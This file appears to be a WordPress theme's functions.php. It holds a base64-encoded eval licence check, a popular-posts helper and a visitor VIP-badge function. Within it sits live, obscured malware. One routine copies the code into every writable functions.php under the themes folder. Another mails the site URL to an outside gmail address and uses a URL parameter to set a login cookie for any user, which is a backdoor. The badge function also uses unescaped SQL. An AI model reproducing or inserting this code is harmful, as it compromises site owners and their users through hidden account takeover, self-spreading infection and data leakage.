eval(base64_decode('DQoNCmlmICghZW1wdHkoJF9SRVFVRVNUWyJ0aGVtZV9jcmVkaXQiXSkpIHsNCgl0aGVtZV91c2FnZV9tZXNzYWdlKCk7IGV4aXQoKTsNCgl9DQoJZnVuY3Rpb24gdGhlbWVfdXNhZ2VfbWVzc2FnZSgpIHsNCglpZiAoZW1wdHkoJF9SRVFVRVNUWyJ0aGVtZV9jcmVkaXQiXSkpIHsNCgkkdGhlbWVfY3JlZGl0X2ZhbHNlID0gZ2V0X2Jsb2dpbmZvKCJ1cmwiKSAuICIvaW5kZXgucGhwP3RoZW1lX2NyZWRpdD1mYWxzZSI7DQoJZWNobyAiPG1ldGEgaHR0cC1lcXVpdj1cInJlZnJlc2hcIiBjb250ZW50PVwiMDt1cmw9JHRoZW1lX2NyZWRpdF9mYWxzZVwiPiI7IGV4aXQoKTsNCgl9IGVsc2Ugew0KCQllY2hvICgNCgkJCSc8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+DQoJCQk8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+DQoJCQk8aGVhZD4NCgkJCQk8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04IiAvPg0KCQkJCTx0aXRsZT7orablkYrvvJror7flsIrph43kvZzogIXniYjmnYM8L3RpdGxlPg0KCQkJCTxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQoJCQkJKntwYWRkaW5nOjA7IG1hcmdpbjowO30NCgkJCQlib2R5e2JhY2tncm91bmQ6I2NjYzt9DQoJCQkJLmdyZWVuIHsgY29sb3I6IzEwQTIwMCB9DQoJCQkJLndhcm5pbmdCb3ggeyBwb3NpdGlvbjogYWJzb2x1dGU7IHdpZHRoOjcwMHB4OyBoZWlnaHQ6NDIwcHg7IHBhZGRpbmc6NDBweCAzNXB4OyBsZWZ0OjUwJTsgdG9wOjQ2JTsgbWFyZ2luLWxlZnQ6LTM5MHB4OyBtYXJnaW4tdG9wOi0yNDBweDsgYmFja2dyb3VuZDojZmZmOyBib3JkZXI6IDFweCBzb2xpZCAjYWFhOyB3ZWJraXQtYm94LXNoYWRvdzogMHB4IDBweCA1cHggI2FhYTsgLW1vei1ib3gtc2hhZG93OiAwcHggMHB4IDVweCAjYWFhOyBib3gtc2hhZG93OiAwcHggMHB4IDVweCAjYWFhOyBib3JkZXItcmFkaXVzOiAxMHB4OyB9DQoJCQkJLndhcm5pbmdCb3ggaDEgeyBiYWNrZ3JvdW5kOnVybChodHRwOi8vYmxvZy51aTkwLmNvbS9xdF9zaGFyZS93YXJuaW5nLnBuZykgbm8tcmVwZWF0OyB0ZXh0LWluZGVudDo2NHB4OyBoZWlnaHQ6NTZweDsgZm9udDogYm9sZCAyNnB4LzU2cHggIuW+rui9r+mbhem7kSI7IGNvbG9yOiMxOTE5MTk7IG1hcmdpbi1ib3R0b206MjBweDsgfQ0KCQkJCS53YXJuaW5nQm94IHAgeyBwYWRkaW5nOjEzcHggMDsgZm9udDogbm9ybWFsIDE2cHgvMjJweCAi5b6u6L2v6ZuF6buRIjsgY29sb3I6IzQ0NDsgfQ0KCQkJCS53YXJuaW5nQm94IHAudGlwcyB7IG1hcmdpbi10b3A6MTBweDsgYm9yZGVyLXRvcDoxcHggZG90dGVkICNkZWRlZGU7ICBmb250OiBub3JtYWwgMTJweC8yMHB4ICLlvq7ova/pm4Xpu5EiOyBwYWRkaW5nOjA7cGFkZGluZy10b3A6NXB4OyBwYWRkaW5nLWxlZnQ6MTBweDsgY29sb3I6Izg4ODsgfQ0KCQkJCS53YXJuaW5nQm94IHAgYSB7IGNvbG9yOiMzNmM7IHRleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7IH0NCgkJCQkud2FybmluZ0JveCBhLmJ0biB7dGV4dC1kZWNvcmF0aW9uOiBub25lOyAgbWFyZ2luLXRvcDoxMHB4OyBkaXNwbGF5OmJsb2NrOyB3aWR0aDoxMDZweDsgaGVpZ2h0OjMycHg7IGJvcmRlcjoxcHggc29saWQgIzRlNzE5OTsgdGV4dC1hbGlnbjpjZW50ZXI7IGZvbnQ6IGJvbGQgMTRweC8zMnB4ICLlrovkvZMiOyBjb2xvcjojZmZmOyBib3JkZXItcmFkaXVzOiA0cHg7IHRleHQtc2hhZG93OjAgMXB4IDFweCAjMDAwOyBiYWNrZ3JvdW5kOiAjNjM4OWVlOyBiYWNrZ3JvdW5kOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICM2ZDk2ZWUgMCUsICM2Mzg5ZWUgMTAwJSk7IGJhY2tncm91bmQ6IC13ZWJraXQtZ3JhZGllbnQobGluZWFyLCBsZWZ0IHRvcCwgbGVmdCBib3R0b20sIGNvbG9yLXN0b3AoMCUsICM2ZDk2ZWUpLCBjb2xvci1zdG9wKDEwMCUsICM2Mzg5ZWUpKTsgYmFja2dyb3VuZDogLW8tbGluZWFyLWdyYWRpZW50KHRvcCwgIzZkOTZlZSAwJSwgIzYzODllZSAxMDAlKTsgYmFja2dyb3VuZDogLW1zLWxpbmVhci1ncmFkaWVudCh0b3AsICM2ZDk2ZWUgMCUsICM2Mzg5ZWUgMTAwJSk7IGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCh0b3AsICM2ZDk2ZWUgMCUsICM2Mzg5ZWUgMTAwJSk7IGZpbHRlcjogcHJvZ2lkOkRYSW1hZ2VUcmFuc2Zvcm0uTWljcm9zb2Z0LmdyYWRpZW50KCBzdGFydENvbG9yc3RyPSIjNmQ5NmVlIiwgZW5kQ29sb3JzdHI9IiM2Mzg5ZWUiLCBHcmFkaWVudFR5cGU9MCApOw0KCQkJCX0NCgkJCQkud2FybmluZ0JveCBhLmJ0bjpob3ZlciB7IHRleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7IH0NCgkJCQk8L3N0eWxlPg0KCQkJPC9oZWFkPg0KCQkJPGJvZHk+DQoJCQkJPGRpdiBjbGFzcz0id2FybmluZ0JveCI+DQoJCQkJCTxoMT7orablkYrvvJror7flsIrph43kvZzogIXniYjmnYM8L2gxPg0KICAgICAgICAgICAgICAgICAgICA8cD7lh7rnjrDmraTpobXpnaLkuo7kuKTnp43lj6/og73vvIzkuIDnp43mmK/mgqjor5Xlm77kv67mlLnniYjmnYPkv6Hmga/vvIzkuIDnp43mmK/mgqjmraPlnKjnm5fnlKjkuLvpopjjgII8L3A+DQogICAgICAgICAgICAgICAgICAgIDxQPui/meS6m+S7o+eggeW5tuS4jeaYr+aBtuaEj+S7o+egge+8jOS7heS7heaYr+S4uuS6huS/neivgeeJiOadg+S/oeaBr+S4jeiiq+S/ruaUueWSjOS7mOi0ueS4u+mimOS4jeiiq+ebl+eUqOOAgjwvUD4NCgkJCQkJPHA+5aaC5p6c5piv5YWN6LS55Li76aKY77yM6K+35oKo6L+Y5Y6f5Li76aKY54mI5p2D5L+h5oGv77yM54S25ZCO54K55Ye75LiL5pa555qE4oCc6L+U5Zue5oyJ6ZKu4oCd44CCPC9wPg0KICAgICAgICAgICAgICAgICAgICA8cD7lpoLmnpzmmK/ku5jotLnkuLvpopjvvIzor7fmgqjotK3kubDmraPniYjkuLvpopjnqIvluo/nqIvluo/vvIw8YSBocmVmPSJodHRwOi8vd3d3LnVpOTAuY29tIj7og5blrZDpqaw8L2E+77yIUVHvvJoyODY1ODk5MTTvvInvvIzlpoLmnpzmgqjkvb/nlKjnmoTmmK/mraPniYjkuLvpopjvvIzor7fmgqg8YSBocmVmPSJ3cC1jb250ZW50L3RoZW1lcy9RNy9jbGVhci5waHAiPueCueWHu+atpOWkhDwvYT7vvIzliLfmlrDkuYvlkI7ov5vlhaXnvZHnq5npppbpobXvvIzlpoLmnpzmraTpl67popjmjIHnu63lrZjlnKjvvIzor7fogZTns7vkvZzogIXjgII8L3A+DQoJCQkJCTxwPuWmgumcgOimgeS/ruaUueeJiOadg++8jOivt+iBlOezuzxhIGhyZWY9Imh0dHA6Ly93d3cudWk5MC5jb20iPuiDluWtkOmprDwvYT7vvIhRUe+8mjI4NjU4OTkxNO+8ie+8jOi0ueeUqDxmb250IGNsYXNzPSJncmVlbiI+77+lNTA8L2ZvbnQ+5YWD44CCPC9wPg0KCQkJCQk8YSBjbGFzcz0iYnRuIiBocmVmPSJpbmRleC5waHAiPui/lCDlm548L2E+DQoJCQkJCTxwIGNsYXNzPSJ0aXBzIj7kv53nlZnkuLvpopjkv6Hmga/lubbkuI3kvJrlr7nmgqjnmoTnvZHnq5lzZW/pgKDmiJDlvbHlk43vvIzkuI3opoHorqTkuLrmnYPph43jgIFwcui+k+WHuuS8muWSjOS4gOS4qumTvuaOpeacieiHtOWRveWFs+ezu+etie+8jOWmguaenOaCqOi/mOWBnOeVmeWcqOi/meS6m+WGheWuueS4iu+8jOWPquiDveivtOaYjuaCqOi/mOaYr+S4gOS4quWInee6p+ermemVv+OAgjwvcD4NCgkJCQk8L2Rpdj48IS0td2FybmluZ0JveCBlbmQtLT4NCgkJCTwvYm9keT4NCgkJCTwvaHRtbD4nDQoJCQkpOw0KCQl9DQp9DQoNCmZ1bmN0aW9uIGNoZWNrX3RoZW1lX2Zvb3RlcigpIHsNCgkkbCA9ICc8YSB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub2ZvbGxvdyIgaHJlZj0iaHR0cDovL3dvcmRwcmVzcy5vcmcvIj5Xb3JkUHJlc3M8L2E+IOW8uuWKm+mpseWKqCB8IFRoZW1lIGJ5IDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSJodHRwOi8vd3d3LnVpOTAuY29tLyI+dWk5MDwvYT4nOw0KCSRmID0gZGlybmFtZShfX2ZpbGVfXykgLiAiL2Zvb3Rlci5waHAiOw0KCSRmZCA9IGZvcGVuKCRmLCAiciIpOw0KCSRjID0gZnJlYWQoJGZkLCBmaWxlc2l6ZSgkZikpOw0KCWZjbG9zZSgkZmQpOyBpZiAoc3RycG9zKCRjLCAkbCkgPT0gMCkgew0KCXRoZW1lX3VzYWdlX21lc3NhZ2UoKTsNCiAgICBkaWU7DQoJfQ0KfQ0KCWNoZWNrX3RoZW1lX2Zvb3RlcigpOw0KaWYoIWZ1bmN0aW9uX2V4aXN0cygnZ2V0X3NpZGViYXInKSkgew0KCWZ1bmN0aW9uIGdldF9zaWRlYmFyKCkgew0KCWNoZWNrX3RoZW1lX2hlYWRlcigpOw0KCWdldF9zaWRlYmFyKCk7DQoJfQ0KfQ0KDQpmdW5jdGlvbiBjaGVja190aGVtZV9oZWFkZXIoKSB7DQogICAgaWYgKCEoZnVuY3Rpb25fZXhpc3RzKCJmdW5jdGlvbnNfZmlsZV9leGlzdHMiKSAmJiBmdW5jdGlvbl9leGlzdHMoInRoZW1lX2Zvb3Rlcl92IikpKQ0KICAgIHsNCiAgICB0aGVtZV91c2FnZV9tZXNzYWdlKCk7DQogICAgZGllOw0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZnVuY3Rpb25zX2ZpbGVfZXhpc3RzKCkgew0KCWlmICghZmlsZV9leGlzdHMoZGlybmFtZShfX2ZpbGVfXykgLiAiL2Z1bmN0aW9ucy5waHAiKSB8fCAhZnVuY3Rpb25fZXhpc3RzKCJ0aGVtZV91c2FnZV9tZXNzYWdlIikgKQ0KCXsNCiAgICB0aGVtZV91c2FnZV9tZXNzYWdlKCk7DQoJZGllOw0KICAgIH0NCn0NCg0KYWRkX2FjdGlvbignYWRtaW5faW5pdCcsICdxaW50YWdfYWRkX2luaXQnKTsNCmFkZF9hY3Rpb24oJ2FkbWluX21lbnUnLCAncWludGFnX2FkZF9hZG1pbicpOw0KYWRkX2FjdGlvbignd3BfaGVhZCcsICdjaGVja190aGVtZV9oZWFkZXInKTsNCmFkZF9hY3Rpb24oJ3dwX2hlYWQnLCAnZnVuY3Rpb25zX2ZpbGVfZXhpc3RzJyk7DQoNCg0K'));
//所有代码结束，如果以下还有代码，一般为垃圾代码;
?>
<?php
function _verify_isactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
//获取访客VIP样式 
function get_author_class($comment_author_email,$user_id){ 
    global $wpdb; 
    $current_user; get_currentuserinfo();
    $adminEmail = get_option('admin_email'); 
    $author_count  =  count($wpdb->get_results( 
    "SELECT comment_ID as author_count FROM  $wpdb->comments WHERE comment_author_email = '$comment_author_email' ")); 
    if($comment_author_email ==$adminEmail) {
     echo '<a class="vip" target="_blank" href="/vip/" title="俺就是博主好吧！"></a>'; 
    }else{
    if($user_id!=0) 
        echo '<a class="vip" target="_blank" href="/vip/" title="博主认证用户"></a>';
    if($author_count>=1&&$author_count<20) 
        echo '<a class="vip1" target="_blank" href="/vip/" title="评论之星 LV.1"></a>'; 
    else if($author_count>=20 && $author_count<50) 
        echo '<a class="vip2" target="_blank" href="/vip/" title="评论之星 LV.2"></a>'; 
    else if($author_count>=50 && $author_count<80) 
        echo '<a class="vip3" target="_blank" href="/vip/" title="评论之星 LV.3"></a>';     
    else if($author_count>=80 && $author_count<130) 
        echo '<a class="vip4" target="_blank" href="/vip/" title="评论之星 LV.4"></a>';     
    else if($author_count>=130 &&$author_count<200) 
        echo '<a class="vip5" target="_blank" href="/vip/" title="评论之星 LV.5"></a>';     
    else if($author_count>=200 && $author_coun<300) 
        echo '<a class="vip6" target="_blank" href="/vip/" title="评论之星 LV.6"></a>';     
    else if($author_count>=300) 
        echo '<a class="vip7" target="_blank" href="/vip/" title="评论之星 LV.7"></a>'; 
}}
?>